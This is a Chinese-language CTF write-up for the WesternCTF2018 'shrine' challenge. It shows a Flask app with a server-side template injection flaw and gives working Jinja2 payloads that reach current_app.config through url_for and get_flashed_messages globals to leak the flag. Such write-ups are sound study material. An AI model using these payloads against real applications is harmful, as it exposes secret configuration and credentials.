+++
title = "[WesternCTF2018]shrine"
slug = "westernctf2018-shrine"
description = "环境变量里面有什么呢"
date = "2024-08-31T15:13:28"
lastmod = "2024-08-31T15:13:28"
image = ""
license = ""
categories = ["复现"]
tags = ["ssti"]
+++

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{ % set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)
```

拿到源码之后很明显的`SSTI`漏洞

但是这里貌似是一个新姿势，需要了解一些知识就是

> 为了获取讯息，我们需要读取一些例如`current_app`这样的全局变量。
>
> 看了其他师傅的WP，python的沙箱逃逸这里的方法是`利用python对象之间的引用关系来调用被禁用的函数对象`。
>
> 这里有两个函数包含了`current_app`全局变量，`url_for`和`get_flashed_messages`
>
> app.config就可以直接的查阅配置信息

```
/shrine/name={{get_flashed_messages.__globals__['current_app'].config}}

/shrine/name={{url_for.__globals__['current_app'].config}}
```

